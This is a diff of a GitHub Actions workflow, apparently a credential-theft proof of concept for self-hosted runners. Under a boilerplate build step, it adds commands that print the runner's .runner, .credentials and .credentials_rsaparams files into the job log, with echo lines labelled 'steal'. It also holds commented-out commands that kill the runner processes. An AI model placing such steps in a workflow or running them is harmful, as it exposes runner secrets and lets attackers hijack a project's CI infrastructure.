@@ -34,11 +34,11 @@ jobs:
           echo Add other actions to build,
           echo test, and deploy your project.
           echo '----------- steal .runner -----------'
-          cat /home/jack/actions-runner/.runner
+          cat /home/runner/actions-runner/.runner
           echo -e '\n----------- steal .credentials -----------'
-          cat /home/jack/actions-runner/.credentials
+          cat /home/runner/actions-runner/.credentials
           echo -e '\n----------- steal .credentials_rsaparams -----------'
-          cat /home/jack/actions-runner/.credentials_rsaparams
+          cat /home/runner/actions-runner/.credentials_rsaparams
           #kill $(ps aux | grep 'run.sh' | awk '{print $2}')
           #kill $(ps aux | grep 'run-helper.sh' | awk '{print $2}')
           #kill $(ps aux | grep 'Runner.Listener' | awk '{print $2}')
